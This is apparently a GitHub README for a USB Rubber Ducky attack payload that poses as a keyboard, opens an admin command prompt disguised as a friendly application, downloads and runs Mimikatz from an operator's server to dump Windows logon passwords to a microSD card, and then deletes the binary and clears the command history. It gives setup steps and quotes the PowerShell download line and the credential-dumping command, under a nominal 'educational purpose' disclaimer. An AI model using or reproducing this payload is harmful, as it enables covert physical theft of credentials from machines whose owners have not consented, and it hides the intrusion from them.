***only educational purpose***

# Mimikatz payload
This Mimikatz payload is an update of <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---mimikatz-payload">redmeatuk's payload</a>.

This script download <a href='https://github.com/ParrotSec/mimikatz'>Mimikatz.exe</a> then execute it, and save all the results in a .txt file on the microSD card.

## Setup the Rubber Ducky : 
1. First, you need to flash the Rubber Ducky with twin duck firmware. <a href='https://youtu.be/z5UUTUmGQlY?t=935'> Here is the hak5 video where Darren shows how to do it.</a>
2. Then you have to adapt the script for your needs, for example, you have to put your own server name with mimikatz.exe in it and you have to change MicroSD letter (E:, G:, etc..).    
   ```
   21.STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<your servername>/mimikatz.exe',[...])
                                                                                     ^
   26.STRING %TEMP%\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> G:\mimikatz_output.txt
                                                                                         ^
   ```
3. And, for finish, you have to encode the script and put it in your MicroSD card

## How the script work, in details

In a ***first*** time, the script **waits** 3 sec before doing things to let the computer **recognize** the Rubber Ducky as a keyboard.

In a ***second*** time, the script **launch** a cmd with admin privileges and **change** the theme and the size of the cmd to appear like a more _friendly GUI_ application.

In a ***third*** time, the script **Download and execute** mimizatz and **save the results** in a text file named mimikatz_output.txt

And in a ***final*** time, the script **covers our tracks** by deleting mimizatz.exe and clearing the command history

DATA


you can ask me if you need help or something about.
Good Day !

